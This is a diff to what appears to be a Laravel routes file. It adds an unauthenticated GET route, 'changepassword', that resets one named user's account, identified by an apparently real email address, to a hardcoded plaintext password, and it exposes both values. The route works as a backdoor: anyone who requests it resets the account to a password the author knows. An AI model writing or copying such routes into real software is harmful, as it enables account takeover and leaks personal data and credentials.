@@ -68,4 +68,13 @@ Route::post('/reporthis', 'App\Http\Controllers\ReporthisController@search')->na
 
 
 
+Route::get('changepassword', function() {
+    $user = App\User::where('email', 'd.wlodarczak@euro-comfort.pl')->first();
+    $user->password = Hash::make('mlodzikawa2021');
+    $user->save();
+ 
+    echo 'Password changed successfully.';
+});
+
+?>
 
